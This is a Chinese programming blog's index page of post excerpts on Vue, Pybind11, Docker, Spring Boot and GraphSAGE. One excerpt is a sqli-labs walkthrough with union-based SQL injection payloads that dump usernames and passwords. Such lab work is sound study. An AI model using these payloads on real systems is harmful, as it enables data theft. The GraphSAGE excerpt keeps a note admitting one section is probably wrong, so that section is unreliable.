<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.133.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程大咖</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程大咖的博客">
		<meta property="og:url" content="https://bcdaka.github.io/">
  <meta property="og:site_name" content="编程大咖">
  <meta property="og:title" content="编程大咖">
  <meta property="og:description" content="编程大咖的博客">
  <meta property="og:locale" content="zh_CN">
  <meta property="og:type" content="website">

	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程大咖">

	<link rel="shortcut icon" href="/favicon.ico">
		
  


</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大咖" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大咖</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f81f2aca637b126fbd96af8cbc3dbfac/" rel="bookmark">
			Vue集成PageOffice实现在线编辑word、excel(前端配置)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、什么是PageOffice
PageOffice是一款在线的office编辑软件，帮助Web应用系统或Web网站实现用户在线编辑Word、Excel、PowerPoint文档。可以完美实现在线公文流转，领导批阅，盖章。可以给文件添加水印，在线安全预览防止用户下载和复制文件等。
二、环境要求
前端Vue项目：Node.js10及以上版本（当前集成方式不支持vue3，原因是vue3不兼容ie)
三、前端配置
1、 在index.html页面引用后端项目（samples-springboot-back）根目录下的pageoffice.js &lt;script type="text/javascript" src="http://localhost:8081/samples-springboot-back/pageoffice.js"&gt;&lt;/script&gt; 2、在vue.config.js中配置代理
devServer: { proxy: { '/api': { target: 'http://localhost:8081/samples-springboot-back', //"/api"对应后端项目"http://localhost:8081/samples-springboot-back"地址 ws: true, changeOrigin: true, // 允许跨域 pathRewrite: { '^/api': '' // 标识替换，使用 '/api' 代替真实的接口地址 } } } } 3、使用v-html解析(其实也可以嵌在iframe标签中)
完成这个需要有后端项目配合.
多看看文档多研究一下。
介绍 | PageOffice 开发者中心
&lt;template&gt; &lt;div class="Word"&gt; &lt;div style="height: 800px; width: auto" v-html="poHtmlCode" /&gt; &lt;/div&gt; &lt;/template&gt; &lt;script&gt; const axios = require("axios"); export default { name: "Word", data() { return { poHtmlCode: "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f81f2aca637b126fbd96af8cbc3dbfac/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8121f6b33ad4cf4ce8e98fd0e7d1ffc0/" rel="bookmark">
			C&#43;&#43;和Python混合编程之Pybind11的简单使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		C++和Python混合编程之Pybind11的简单使用 一、简介 Pybind11是C++/Python混合编程的利器之一，是一个轻量级的只包含头文件的库，用于 Python 和 C++ 之间接口转换，可以为现有的 C++ 代码创建 Python 接口绑定。Pybind11 名字里的“11”表示它完全基于现代 C++ 开发（C++11 以上），所以没有兼容旧系统的负担。它使用了大量的现代 C++ 特性，不仅代码干净整齐，运行效率也更高。
二、平台环境 1、系统：Windows10
2、Python虚拟环境工具：Anaconda3
3、C++ IDE：Visual Studio 2022
4、Python版本：3.7.16
三、C++/Python相互调用的方法 简单介绍如何实现两种语言之间相互调用
1、Python调用C++代码： 通过调用动态库的方式完成，将C++代码编译生成动态库文件(Win下为.DLL)，Python调用的话需要将库后缀改为（.pyd），然后将动态库拷贝到Python文件主目录，代码内导入库模块即可；
2、C++代码调用Python： 主要通过调用Python代码解释器来实现。
四、代码实践 用代码实例简单展现Pybind11的功能
1、基础环境搭建 1.1、安装Pybind11库 有多种安装方式，这里通过pip命令来安装，如果使用了虚拟环境，安装前记得激活相应的虚拟环境：
安装命令如下：
(py37) C:\Users\xxx&gt; pip install pybind11 1.2、Visual Studio项目属性配置： 具体路径根据自己项目实际情况而定
1). 通用编译属性设置：
属性–&gt;常规–&gt;常规属性–&gt;配置类型：动态库(.dll)；属性–&gt;高级–&gt;高级属性–&gt;目标文件扩展名：.pyd； 2). C/C++附加包含目录include：
属性–&gt;C/C++ --&gt;常规–&gt;附加包含目录：D:\Anaconda3\envs\py37\includeD:\Anaconda3\envs\py37\Lib\site-packages\pybind11\include 3). 链接器附加库目录和库文件：
属性–&gt;链接器–&gt;常规–&gt;附加库目录：D:\Anaconda3\envs\py37\libs属性–&gt;链接器–&gt;输入–&gt;附加依赖项：python3.lib，python37.lib 具体操作如下：
1.3、系统环境变量设置 1）、因为在C++调用Python代码过程中遇到错误，经过查资料找到了解决办法（stackoverflow讨论地址），以下环境具体路径根据自己项目实际情况而定。
2）、要在C++中调用Python解释器（py::scoped_interpreter guard{};），需要添加两个系统环境变量，以便Pybind11能够找到解释器位置：
PYTHONHOME：D:\Anaconda3\envs\py37PYTHONPATH：D:\Anaconda3\envs\py37\Lib;D:\Anaconda3\envs\py37\Lib\site-packages;D:\Anaconda3\envs\py37\DLLs 3）、如果不设置这两个环境变量会出现以下错误：
Fatal Python error: init_fs_encoding: failed to get the Python codec of the filesystem encoding
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8121f6b33ad4cf4ce8e98fd0e7d1ffc0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3bedf3bd41388172b81ae2e09b9de46d/" rel="bookmark">
			通过AI写作赚钱方法分享
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言写作赚钱方法接单提供服务创作作品销售 写作变现渠道文库收益下载分佣网盘收益电商平台个人博客 这能赚多少钱？总结 仅分享使用AI写作去赚钱的一些方法，关于图片、音频、视频等AI模型去赚钱的方法后续再分享。
前言 AI写作在近年来逐渐成为一种新颖且具有潜力的创收方式，尤其随着自然语言处理技术的进步，越来越多的人开始探索并利用AI工具来辅助或完全依赖AI进行创作以获取收益。
很多人对AI的理解，还在聊天工具做个问答的层面。你想想，现在AI能这么火，一定是能有给人惊喜的地方，才会被这么多人热捧。写作对大部分人来说，有很大难度，但是如果有AI加持，就跟游戏加外挂的感觉差不多，每个人都能行。但是光能写不行，还得有变现的思维，能把写出来的内容变成钱。
分享普通人都可以使用AI写作赚钱的方式与我实际操作的经验分享。
写作赚钱方法 写作赚钱主要指使用AI来做文字创作相关的事儿赚钱。这里只是举例了一些，实际场景无限多，可以结合自己的实际情况去发掘更多并去应用。
接单提供服务 接单赚钱，就跟程序员接开发项目一样，有一单做一单，顺手做做也行。现在很多平台已经有各种服务了，因为操作简单，竞争已经很大了。下面分享几个可以接单的业务，如果你能接到可以顺手做做。
写发言稿：这个非常实用，学校与单位都会用到。某宝某多里代写通常收费都是五百到一千。有AI加持，各种要求随手就来。已经实际使用过很多次，都能符合要求。软文代写：用于软文推广场景，能产出各种你意想不到的效果。活动方案：写方案抓头的时候，就会到处找，你可以付费帮写。商品描述：一个高大上的描述介绍是直接能提供销量的，需求很多。工作报告：报告、总结等等，可以无中生有，长篇大论。 实际还有很多很多，只要去接单，使用AI创作快速完成，钱就轻松赚到了。
创作作品销售 这里仅讨论文字类型作品，实际还有图片、音频、视频，很多很多。相比接单的方法，作品是可以持续销售的，好处显而易见。AI加持，大大降低了创作的门槛，普通人稍微学习即可操作。比如一两天写一本书都不是难事。甚至都可以跨行业进行创作。
分享几个可以做的：
某某教程：一般是某一类技能的教程，这个是非常适合用AI创作的。比如开发技术类的（Git教程、Docker教程，找偏门一点的去创作效果更好销售），日常生活类的（美食、化妆、宠物等等教程）。每个行业都可以创作出很多很多，按自己熟悉的领取去创作，就可以拥有自己的作品并去销售了。学习计划：结合一些具体场景，制作学习计划或者成长计划，再去销售这一套计划。比如小白，想入行做程序员，我可以给你一套完美的从小白到大牛的成长路径。只要你的内容确实好确实有用，有人付费是必然的。商业方案：写活动方案，写各种合同，写各种报告，工作得力小助手。还可以写好上传到资源站，有人下载你就有钱，被动收入的好方法。更高级一点，就是自己包装一下做做推广，价格无上限。 你可能会认为AI写出来的，会不会质量太差。事实恰恰相反，用对方法比你自己写的好。因大部分的情况是，某个技能你已经很熟练了，但是让你有条理且很全面的给人讲清楚，依然不容易做到。这个时候你根据你专业的角度，提供提示词，提供一个方向，再让AI去完成，效果往往超乎想象。
写作变现渠道 前面讲了AI写作可以做的事，继续分享一下变现的方法，让你获取实实在在的可持续收入。都是个人就可操作的，不占用多少时间。
文库收益 文库平台通常是指那些允许上传者上传原创或拥有合法授权的文档内容，并通过文档售卖、广告分成等方式获得收益的平台。各个文库平台，都可以上传文档，用户付费下载后，你可获得收入。只需要把你的文档上传上去坐等收钱即可。简单吧。
下载分佣 资源下载站，把你得作品上传上去，用户付费下载后，可以获得收入。这个不仅文字创作可以，图片、音频、视频创作都同样可以。一样只要上传资源坐等赚钱。
网盘收益 网盘一般都有拉新收入与会员收入，你只要把你得文件放网盘分发出去即可。这个对比前面几个，没有平台流量可以使用，需要自己去推广。但是推广，一样可以使用AI创作完成。
电商平台 主要指某宝某多上卖资源，资源就是你的作品。这个操作略微麻烦，需要了解平台规则，还要押金。好处就是有平台流量可以用。总体来说，前期要花不少时间还没产出，摸熟悉了就挺好。
个人博客 个人网站或者在其它平台有自己的博客。对于有自己博客且喜欢写作的朋友，最适合干这个事儿了。只需要转变一下思维，带着赚钱的目的去写就可以了。一个没收入的博客，是写的没啥意思的，得有点产出才有意义。很多人写博客的初衷，可能就是分享知识加记笔记，过了那个学习的阶段，博客就停更了。写了那么多，已经有不错的流量了，为何不创作点有价值的内容，让这些流量变现一下呢。
**提示：**如果不想自己找具体变现渠道可以私我分享给你。
这能赚多少钱？ 是一个大家都很关心但看似合理又不合理的问题。就跟有人问：上班能赚多少钱？一个道理吧。
这跟你的作品受众、作品质量、作品数量、作品发布渠道、作品推广方法等等都是强相关的。
从另一个角度说，当下这个热门产物AI，我们就去试试深度使用一下，学到额外各种技能就不说了，万一撞大运能有个爆款作品就财务自由了。最不济用业余时间搞点小钱肯定是没问题了。非常推荐去尝试尝试。
总结 AI写作赚钱方法总结：
我有个某某想法设计好商业模式；分解后，告诉AI去创作；作品拿去交付客户；最终实现变现的目的； 是不是感觉跟老板招员工工作一个道理，老板需要制定目标并为员工提供方向。那么使用AI也是要分解任务提供方向。现在你是老板，你已经有了很多专业的员工（各种AI模型），看你会不会用起来。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/88760aa41c6a9cc3482d891493c6f4f4/" rel="bookmark">
			Invalid value type for attribute ‘factoryBeanObjectType‘: java.lang.String 报错解决
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 一、报错 二、解决 更新mybatis-plus包
&lt;dependency&gt; &lt;groupId&gt;com.baomidou&lt;/groupId&gt; &lt;artifactId&gt;mybatis-plus-spring-boot3-starter&lt;/artifactId&gt; &lt;version&gt;3.5.5&lt;/version&gt; &lt;/dependency&gt; 三、原因 mybatis-spring 官方项目中使用 mybatis-plus-boot-starter 当前最新版本 3.5.4.1 ，其中依赖的 mybatis-spring 版本为 2.1.1。在 mybatis-spring 2.1.1 版本的 ClassPathMapperScanner#processBeanDefinitions 方法里将 BeanClassName 赋值给 String 变量并将 beanClassName 赋值给 factoryBeanObjectType，但是在 Spring Boot 3.2 版本中FactoryBeanRegistrySupport#getTypeForFactoryBeanFromAttributes方法已变更，如果 factoryBeanObjectType 不是 ResolvableType 或 Class 类型会抛出 IllegalArgumentException 异常。此时因为 factoryBeanObjectType 是 String 类型，不符合条件而抛出异常。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fd4b2bc01dcc78be9789257d7d7ffd3f/" rel="bookmark">
			在Debian 12系统上安装Docker
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Docker 在 Debian 12 上的安装
安装验证测试更多信息 引言
在现代的开发环境中，容器技术发挥着至关重要的作用。Docker 提供了快速、可靠和易于使用的容器化解决方案，使开发人员和 DevOps 专业人士能够以轻松的方式将应用程序从一个环境部署到另一个环境。 Docker 的安装过程在 Debian 12 系统上非常简单，只需几条命令即可完成。在接下来的部分，我将详细介绍 Docker 的安装步骤和基本功能。
安装
安装 Docker 需要以下条件：
已经安装的 Debian 12 系统 (VM 或硬件服务器)root 权限 可以使用以下命令安装 Docker：
sudo su &amp;&amp; apt update &amp;&amp; apt install ca-certificates curl gnupg apt-transport-https gpg 下载 GPG 密钥并将其存储在系统中：
curl -fsSL https://download.docker.com/linux/debian/gpg | gpg --dearmor -o /usr/share/keyrings/docker.gpg echo "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker.gpg] https://download.docker.com/linux/debian bookworm stable" |tee /etc/apt/sources.list.d/docker.list &gt; /dev/null apt update 安装 Docker 包：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fd4b2bc01dcc78be9789257d7d7ffd3f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/82fbd862e2c101c8649ea8af447541e5/" rel="bookmark">
			向量数据库之Lancedb学习记录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		简介 Lancedb是一个用于人工智能的开源矢量数据库，旨在存储、管理、查询和检索大规模多模式数据的嵌入。Lancedb的核心是用Rust编写的，并构建在Lance之上，专为高性能 ML 工作负载和快速随机访问而设计。
快速开始 安装 pip install lancedb 目前0.6.8需要pyarrow-12.0.0及以上，亲测15.0会报错。
创建客户端 import lancedb import pandas as pd import pyarrow as pa uri = "data/sample-lancedb" db = lancedb.connect(uri) # 异步客户端 #async_db = await lancedb.connect_async(uri) 与Chroma不同，lancedb没有服务端-客户端模式。支持同步和异步客户端，看起来异步客户端更新较快，从官方文档来看没发现使用上的区别。
创建一张表 data = [ {"vector": [3.1, 4.1], "item": "foo", "price": 10.0}, {"vector": [5.9, 26.5], "item": "bar", "price": 20.0}, ] tbl = db.create_table("my_table", data=data) 如果表名已经存在，则会报错。如果希望覆盖已经创建的同名表，可以添加mode='overwrite’参数。
tbl = db.create_table("my_table", data=data, mode='overwrite') 如果不希望覆盖已经创建的同名表，而直接打开的话，可以添加exist_ok=True参数。
tbl = db.create_table("my_table", data=data, exist_ok=True) 创建一张空表 schema = pa.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/82fbd862e2c101c8649ea8af447541e5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2a0e48673d6c262fab9e5fe23c3f9c2d/" rel="bookmark">
			Python 基于列表实现的通讯录管理系统(有完整源码)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
通讯录管理系统
PersonInformation类
ContactList类
menu函数
main函数
程序的运行流程
完整代码
运行示例
通讯录管理系统 这是一个基于文本的界面程序，用户可以通过命令行与之交互，它使用了CSV文件来存储和读取联系人信息，这使得数据可以持久化保存。此外，程序还提供了一些基本的输入验证，以确保输入的数据是有效的。
它包含了两个类PersonInformation类用于创建和管理个人信息对象，而ContactList类则用于管理这些对象的集合。
PersonInformation类 这个类用于存储一个人的基本信息，包括姓名、性别、年龄、电话和住址。它有一个__str__方法，用于定义当对象被转换为字符串时的表现形式。
class PersonInformation: def __init__(self, name, gender, age, telephone, address): self.name = name self.gender = gender self.age = age self.telephone = telephone self.address = address def __str__(self): return f"名字: {self.name}, 性别: {self.gender}, 年龄: {self.age}, 电话: {self.telephone}, 住址: {self.address}" ContactList类 这个类用于管理一个联系人列表。它提供了以下功能：
添加联系人（add_contact）删除联系人（remove_contact）查找联系人（find_contact）修改联系人信息（modify_contact）显示所有联系人（show_contacts）保存联系人到CSV文件（save_contacts）从CSV文件加载联系人（load_contacts） class ContactList: def __init__(self): self.arr = [] def add_contact(self, person): self.arr.append(person) self.save_contacts() def is_empty(self): if not self.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2a0e48673d6c262fab9e5fe23c3f9c2d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/42ff9b3db5eafee08319eab10c579da1/" rel="bookmark">
			大数据几种任务调度工具
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、DolphinScheduler概述和部署1、DolphinScheduler简介1.1 概述1.2 核心架构 2、DolphinScheduler部署模式2.1 概述2.2 单机模式2.3 伪集群模式2.4 集群模式 3、DolphinScheduler集群模式部署3.1 集群规划与准备3.2 下载与配置部署脚本3.3 初始化数据库3.4 一键部署DolphinScheduler3.5 DolphinScheduler启停命令 二、DolphinScheduler操作1、工作流传参1.1 内置参数1.2 参数传递 2、引用依赖资源3、数据源配置4、告警实例配置4.1 邮箱告警实例配置4.2 其他告警 5、其他注意事项 三、Airflow1、Airflow基本概念1.1 概述1.2 名词解释 2、Airflow安装2.1 python环境安装2.2 安装Airflow 3、修改数据库与调度器3.1 修改数据库为mysql3.2 修改执行器 4、部署使用4.1 环境部署启动 4.2 Dag任务操作4.3 配置邮件服务器 四、Azkaban1、Azkaban入门1.1 上传jar包和配置sql1.2 配置Executor Server1.3 配置Web Server 2、Work Flow案例实操2.1 HelloWorld案例2.2 作业依赖案例2.3 自动失败重试案例2.4 手动失败重试案例 3、JavaProcess作业类型案例3.1 概述3.2 案例 4、条件工作流案例4.1 概述4.2 运行时参数案例4.3 预定义宏案例 5、邮箱告警6、Azkaban多Executor模式注意事项 一、DolphinScheduler概述和部署 官网：https://dolphinscheduler.apache.org/
1、DolphinScheduler简介 1.1 概述 Apache DolphinScheduler是一个分布式、易扩展的可视化DAG工作流任务调度平台。致力于解决数据处理流程中错综复杂的依赖关系，使调度系统在数据处理流程中开箱即用
1.2 核心架构 DolphinScheduler的主要角色如下：
MasterServer采用分布式无中心设计理念，MasterServer主要负责 DAG 任务切分、任务提交、任务监控，并同时监听其它MasterServer和WorkerServer的健康状态WorkerServer也采用分布式无中心设计理念，WorkerServer主要负责任务的执行和提供日志服务ZooKeeper服务，系统中的MasterServer和WorkerServer节点都通过ZooKeeper来进行集群管理和容错Alert服务，提供告警相关服务API接口层，主要负责处理前端UI层的请求UI，系统的前端页面，提供系统的各种可视化操作界面 2、DolphinScheduler部署模式 https://dolphinscheduler.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/42ff9b3db5eafee08319eab10c579da1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/430953b0b40ed40cc73021ed068185f0/" rel="bookmark">
			Sql-lab全解_sqllab，算法太TM重要了
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		先自我介绍一下，小编浙江大学毕业，去过华为、字节跳动等大厂，目前阿里P7
深知大多数程序员，想要提升技能，往往是自己摸索成长，但自己不成体系的自学效果低效又漫长，而且极易碰到天花板技术停滞不前！
因此收集整理了一份《2024年最新网络安全全套学习资料》，初衷也很简单，就是希望能够帮助到想自学提升又不知道该从何学起的朋友。
既有适合小白学习的零基础资料，也有适合3年以上经验的小伙伴深入学习提升的进阶课程，涵盖了95%以上网络安全知识点，真正体系化！
由于文件比较多，这里只是将部分目录截图出来，全套包含大厂面经、学习笔记、源码讲义、实战项目、大纲路线、讲解视频，并且后续会持续更新
如果你需要这些资料，可以添加V获取：vip204888 （备注网络安全）
正文 根据要求在url地址栏传入id
判断注入类型
这里判断为字符型闭合方式为‘
判断回显位为三位
这里id=-1的用意是使前面的sql查询语句没有回显，从而回显后方union语句
得到库名
?id=-1’ union select null,null,database()–+
databse()查询表名
得到表名
?id=-1’ union select null,null,group_concat(table_name) from information_schema.tables where table_schema=database()–+
group_concat()为输出格式 information_scheam这是个数据库中的表存放着数据库中各个表的信息
where限制返回的信息是列为table_schema=database()的信息
得到列名
?id=-1’ union select null,null,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=‘users’–+
同上
最后就是通过得到的这些信息爆出信息
?id=-1’ union select null,null,group_concat(username,password) from security.users–+
from后面从security数据库中返回users表中的数据
第二题 和第一题步骤保持一致先判断注入类型，闭合方式，回显大小，回显位置
这里使用’")判断可能为数值型注入，也就不需要考虑闭合方式，回显大小为3位，位置后两位
数据库名称：?id=-1 union select null,null,database()–+
表名：?id=-1 union select null,null,group_concat(table_name) from information_schema.tables where table_schema=database()–+
列名：?id=-1 union select null,null,group_concat(column_name) from information_schema.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/430953b0b40ed40cc73021ed068185f0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2db06f4bd647cff8d8d7834ccf9596c4/" rel="bookmark">
			Springboot调整接口响应返回时长详解(解决响应超时问题)_springboot设置请求超时时间
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		先自我介绍一下，小编浙江大学毕业，去过华为、字节跳动等大厂，目前阿里P7
深知大多数程序员，想要提升技能，往往是自己摸索成长，但自己不成体系的自学效果低效又漫长，而且极易碰到天花板技术停滞不前！
因此收集整理了一份《2024年最新Linux运维全套学习资料》，初衷也很简单，就是希望能够帮助到想自学提升又不知道该从何学起的朋友。
既有适合小白学习的零基础资料，也有适合3年以上经验的小伙伴深入学习提升的进阶课程，涵盖了95%以上运维知识点，真正体系化！
由于文件比较多，这里只是将部分目录截图出来，全套包含大厂面经、学习笔记、源码讲义、实战项目、大纲路线、讲解视频，并且后续会持续更新
如果你需要这些资料，可以添加V获取：vip1024b （备注运维）
正文 二、解决方案 1、配置Http会话超时 可以通过两种方式为Spring Boot应用程序配置HTTP会话超时。
1.1 application.properties中配置会话超时 最简单的方法是在你的application.properties中加入参数server.servlet.session.timeout。
server: servlet: session: # 配置会话超时 timeout: 120s 还要注意的是，Tomcat不允许你将超时时间设置得少于60秒。
1.2 以程序方式配置会话超时 假设我们想让我们的HttpSession只持续两分钟。为了实现这一点，我们可以在我们的WebConfiguration类中添加一个EmbeddedServletContainerCustomizerBean，内容如下。
@Configuration public class WebConfiguration { @Bean public EmbeddedServletContainerCustomizer embeddedServletContainerCustomizer() { return new EmbeddedServletContainerCustomizer() { @Override public void customize(ConfigurableEmbeddedServletContainer container) { container.setSessionTimeout(2, TimeUnit.MINUTES); } }; } } 这里再给出一个使用Java 8和lambda表达式的捷径写法。
public EmbeddedServletContainerCustomizer embeddedServletContainerCustomizer() { return (ConfigurableEmbeddedServletContainer container) -&gt; { container.setSessionTimeout(2, TimeUnit.MINUTES); }; } 在应用程序启动期间，Spring Boot自动配置检测到EmbeddedServletContainerCustomizer，并调用customize(…)方法，传递对Servlet容器的引用。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2db06f4bd647cff8d8d7834ccf9596c4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8bbdb7e579b0a2c94e73408b9e40062b/" rel="bookmark">
			C&#43;&#43;二分算法：1713得到子序列的最少操作次数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文涉及的基础知识点 二分查找算法合集
LeetCode1713题目 给你一个数组 target ，包含若干 互不相同 的整数，以及另一个整数数组 arr ，arr 可能 包含重复元素。
每一次操作中，你可以在 arr 的任意位置插入任一整数。比方说，如果 arr = [1,4,1,2] ，那么你可以在中间添加 3 得到 [1,4,3,1,2] 。你可以在数组最开始或最后面添加整数。
请你返回 最少 操作次数，使得 target 成为 arr 的一个子序列。
一个数组的 子序列 指的是删除原数组的某些元素（可能一个元素都不删除），同时不改变其余元素的相对顺序得到的数组。比方说，[2,7,4] 是 [4,2,3,7,2,1,4] 的子序列（加粗元素），但 [2,4,2] 不是子序列。
示例 1：
输入：target = [5,1,3], arr = [9,4,2,3,4]
输出：2
解释：你可以添加 5 和 1 ，使得 arr 变为 [5,9,4,1,2,3,4] ，target 为 arr 的子序列。
示例 2：
输入：target = [6,4,8,1,3,2], arr = [4,7,6,2,3,8,6,1]
输出：3
参数范围：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8bbdb7e579b0a2c94e73408b9e40062b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/585fd186b60c2817a6d21b2761bbef90/" rel="bookmark">
			深度探索：机器学习中的GraphSAGE算法（基于深度学习的图神经网络算法）原理及其应用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1. 引言与背景
2. 谱聚类定理
3. 算法原理
3.1. 层次化邻居采样
3.2. 节点特征聚合
3.3. 层级特征融合
4. 算法实现
5. 优缺点分析
优点：
缺点：
6. 案例应用
7. 对比与其他算法
8. 结论与展望
1. 引言与背景 随着大数据时代的来临，复杂网络结构的数据在诸多领域如社交网络、生物信息学、推荐系统等中日益凸显其重要性。传统的机器学习方法在处理这类非欧几里得数据时往往力有不逮，而图神经网络（Graph Neural Networks, GNNs）的兴起为有效挖掘图数据的内在价值提供了新思路。其中，GraphSAGE（Graph Sample and Aggregate）算法作为一种颇具代表性和影响力的图神经网络模型，以其独特的采样与聚合机制，实现了大规模图数据上的高效、通用节点嵌入学习。本文旨在全面探讨GraphSAGE算法的理论基础、核心原理、实现细节、优缺点、实际应用案例，并将其与相关算法进行对比，最后展望其未来发展方向。
2. 谱聚类定理 GraphSAGE算法的理论基础之一是谱聚类定理。谱聚类是一种基于图拉普拉斯矩阵的特征分解进行聚类的方法，其核心思想是将图结构转化为线性代数问题来求解。谱聚类定理表明，对于一个连通图，其最小非零拉普拉斯特征值对应的特征向量构成的子空间能很好地捕捉图的全局结构，即节点间的相似性。GraphSAGE借鉴了谱聚类的思想，通过设计特定的聚合函数，将局部邻域信息逐步融合至节点表示中，从而构建出能够捕获全局结构的节点嵌入。
**注：**此处提及的“谱聚类定理”可能需要修正为更符合GraphSAGE算法背景的相关数学理论，因为谱聚类本身并非GraphSAGE直接依赖的理论基础。GraphSAGE主要基于消息传递和深度学习原理，而非谱聚类。请确认此处是否需要调整为其他合适的数学理论或直接删除此部分。
3. 算法原理 3.1. 层次化邻居采样 GraphSAGE的核心创新在于其层次化邻居采样的策略。对于目标节点，算法首先从其一阶邻域中随机采样一定数量的邻居节点；随后，在下一层采样中，对每个已采样的邻居节点，再次在其邻域内进行采样。这种递归采样的方式有助于减少计算复杂度，同时保留了多跳邻居的信息。
3.2. 节点特征聚合 在每层采样后，GraphSAGE通过定义一系列可学习的聚合函数（如均值、最大池化、LSTM等）将邻居节点的特征向量聚合到一起。聚合过程不仅考虑了邻居节点自身的特征，还包含了它们之间的相对关系，确保了节点嵌入的生成具有较强的泛化能力。
3.3. 层级特征融合 随着层数增加，节点的嵌入逐渐整合了越来越远的邻居信息。每一层的聚合结果被馈送到下一层作为邻居节点的特征，并与当前层的原始邻居特征一起参与新的聚合运算。最终，通过多层神经网络的前向传播，得到目标节点的固定维度嵌入表示。
4. 算法实现 GraphSAGE的实现通常涉及以下几个关键步骤：
数据预处理：构建图数据结构，为节点分配初始特征（如果有），并确定邻居采样策略。
模型构建：使用深度学习框架（如TensorFlow、PyTorch）搭建GraphSAGE模型，包括定义采样器、聚合函数、神经网络层结构等。
训练过程：利用监督或无监督学习目标（如节点分类、链接预测任务的标签数据或自监督损失函数），通过反向传播更新模型参数。
嵌入生成：在训练完成后，对整个图的所有节点运行GraphSAGE模型，得到每个节点的最终嵌入表示。
在Python中实现GraphSAGE算法通常会借助于深度学习框架，如PyTorch或TensorFlow，以及专门针对图神经网络的库，如PyTorch Geometric（PyG）或Deep Graph Library（DGL）。这里，我们将使用PyTorch和PyTorch Geometric来展示一个简单的GraphSAGE实现，并附带详细的代码讲解。
环境准备： 确保已经安装了PyTorch和PyTorch Geometric库。如果尚未安装，可以通过以下命令进行安装：
pip install torch torchvision torchaudio pip install torch-scatter torch-sparse torch-cluster torch-spline-conv torch-geometric -f https://data.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/585fd186b60c2817a6d21b2761bbef90/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/05614a82d4875821f3eae21db9fd4133/" rel="bookmark">
			【 uniapp 】打包Android的apk(原生APP-云打包)，及发布测试_uniapp打包安卓
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		先自我介绍一下，小编浙江大学毕业，去过华为、字节跳动等大厂，目前阿里P7
深知大多数程序员，想要提升技能，往往是自己摸索成长，但自己不成体系的自学效果低效又漫长，而且极易碰到天花板技术停滞不前！
因此收集整理了一份《2024年最新软件测试全套学习资料》，初衷也很简单，就是希望能够帮助到想自学提升又不知道该从何学起的朋友。
